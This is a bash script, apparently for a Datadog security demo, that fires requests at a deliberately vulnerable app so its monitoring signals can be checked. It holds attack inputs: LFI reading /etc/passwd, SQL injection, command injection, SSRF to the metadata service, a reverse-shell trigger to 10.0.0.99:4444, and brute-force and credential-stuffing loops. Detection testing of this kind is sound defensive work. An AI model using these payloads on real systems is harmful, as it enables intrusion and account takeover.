#!/usr/bin/env bash
# Runs all demo endpoints (crashes, AAP, CWS, auth) against the app and prints
# the HTTP status + a short response snippet. Useful before walking through the
# Datadog UI to confirm signals are firing.
#
# Usage:
#   ./scripts/security-demo.sh                  # run everything
#   ./scripts/security-demo.sh crashes          # one section only
#   HOST=https://other.example.com ./scripts/security-demo.sh
#
# Sections: crashes, aap, cws, auth

set -u

HOST="${HOST:-https://mcse-dogwiki.com/api}"
SECTION="${1:-all}"

# colors
B='\033[1m'; G='\033[32m'; Y='\033[33m'; R='\033[31m'; D='\033[2m'; N='\033[0m'

hr()    { printf "${D}--------------------------------------------------------------------${N}\n"; }
header(){ printf "\n${B}=== %s ===${N}\n" "$1"; }
hit() {
    local label="$1"; shift
    printf "${B}%-45s${N} " "$label"
    : > /tmp/_demo_body.txt   # truncate so a stale body doesn't show after timeout
    local out code
    out=$(curl -sk --max-time 30 -o /tmp/_demo_body.txt -w "HTTP %{http_code} in %{time_total}s" "$@" 2>&1)
    code=$(printf '%s' "$out" | awk '{print $2}')
    local body
    body=$(head -c 120 /tmp/_demo_body.txt | tr -d '\n')
    case "$code" in
        2*|3*) printf "${G}%s${N}  ${D}%s${N}\n" "$out" "$body" ;;
        4*)    printf "${Y}%s${N}  ${D}%s${N}\n" "$out" "$body" ;;
        *)     printf "${R}%s${N}  ${D}%s${N}\n" "$out" "$body" ;;
    esac
}

run_crashes() {
    header "Crashes / Error Tracking"
    hit "GET /vuln/crash/divide-by-zero"    "$HOST/vuln/crash/divide-by-zero"
    hit "GET /vuln/crash/exception"         "$HOST/vuln/crash/exception"
    hit "GET /vuln/crash/slow?seconds=5"    "$HOST/vuln/crash/slow?seconds=5"
    hit "GET /vuln/crash/cpu (10s burn)"    --max-time 15 "$HOST/vuln/crash/cpu"
    printf "${D}(skipping /vuln/crash/oom — would OOMKill the pod; run manually)${N}\n"
}

run_aap() {
    header "AAP / App & API Protection"
    hit "GET /vuln/lfi /etc/passwd"         "$HOST/vuln/lfi?file=/etc/passwd"
    hit "GET /vuln/sqli SQLi"               "$HOST/vuln/sqli?breed=%27%20OR%20%271%27=%271"
    hit "GET /vuln/cmd id"                  "$HOST/vuln/cmd?cmd=id"
    hit "GET /vuln/ssrf IMDS"               "$HOST/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/"
}

run_cws() {
    header "CWS / Cloud Workload Security"
    hit "GET /vuln/cws/passwd-write"        "$HOST/vuln/cws/passwd-write"
    hit "GET /vuln/cws/spawn-shell"         "$HOST/vuln/cws/spawn-shell"
    hit "GET /vuln/cws/discovery"           --max-time 15 "$HOST/vuln/cws/discovery"
    hit "GET /vuln/cws/crypto-miner"        "$HOST/vuln/cws/crypto-miner"
    hit "GET /vuln/cws/reverse-shell"       "$HOST/vuln/cws/reverse-shell?host=10.0.0.99&port=4444"
    hit "GET /vuln/cws/ld-preload"          "$HOST/vuln/cws/ld-preload"
    hit "GET /vuln/cws/kernel-module"       "$HOST/vuln/cws/kernel-module"
}

run_auth() {
    header "Auth — ATO / Credential Stuffing"
    hit "POST /auth/login (valid)"          -X POST -H 'Content-Type: application/json' \
        -d '{"username":"admin","password":"admin123"}' "$HOST/auth/login"
    hit "POST /auth/login (bad password)"   -X POST -H 'Content-Type: application/json' \
        -d '{"username":"admin","password":"wrong"}' "$HOST/auth/login"

    # Volume matters — ASM's default ATO/brute-force rules need ~10-30+ failed attempts on
    # the same user within ~15 min, and credential stuffing typically expects 100+ failed
    # logins across many usernames from the same IP. Keep --silent to avoid flooding the
    # terminal with one line per request.

    printf "\n${D}Brute force admin (40 attempts, silent)...${N}\n"
    PWORDS="password 123456 admin letmein qwerty welcome dragon hunter2 12345678 abc123 monkey 1234567 changeme test pass1234 root toor master shadow superman 696969 batman trustno1 michael ninja mustang access freedom 555555 666666 ashley 7777777 fuckyou 121212 000000 charlie aa123456 donald password1 qwerty123"
    fails=0
    for pw in $PWORDS; do
        curl -sk --max-time 5 -o /dev/null -X POST \
            -H 'Content-Type: application/json' \
            -d "{\"username\":\"admin\",\"password\":\"$pw\"}" "$HOST/auth/login"
        fails=$((fails+1))
    done
    printf "  ${R}admin: %d failures fired${N}\n" "$fails"

    printf "\n${D}Credential stuffing (120 users x 1 password, silent)...${N}\n"
    fails=0
    for i in $(seq 1 120); do
        curl -sk --max-time 5 -o /dev/null -X POST \
            -H 'Content-Type: application/json' \
            -d "{\"username\":\"user$i\",\"password\":\"P@ssw0rd1\"}" "$HOST/auth/login"
        fails=$((fails+1))
    done
    printf "  ${R}credential-stuffing: %d failures fired${N}\n" "$fails"

    printf "\n${D}ATO simulation: many failures + final success on admin${N}\n"
    sleep 2
    hit "POST /auth/login (success after attack)" -X POST -H 'Content-Type: application/json' \
        -d '{"username":"admin","password":"admin123"}' "$HOST/auth/login"
}

printf "${B}Target:${N} %s\n" "$HOST"
hr

case "$SECTION" in
    crashes) run_crashes ;;
    aap)     run_aap     ;;
    cws)     run_cws     ;;
    auth)    run_auth    ;;
    all)     run_crashes; run_aap; run_cws; run_auth ;;
    *)       echo "Unknown section: $SECTION (use crashes|aap|cws|auth|all)"; exit 1 ;;
esac

printf "\n${B}Done.${N} Check Datadog UI:\n"
printf "  ${D}APM → Error Tracking${N}  (crashes)\n"
printf "  ${D}Security → App & API Protection → Signals${N}  (LFI / SQLi / cmd / SSRF / brute force)\n"
printf "  ${D}Security → Cloud Workload Security → Signals${N}  (CWS rules)\n"
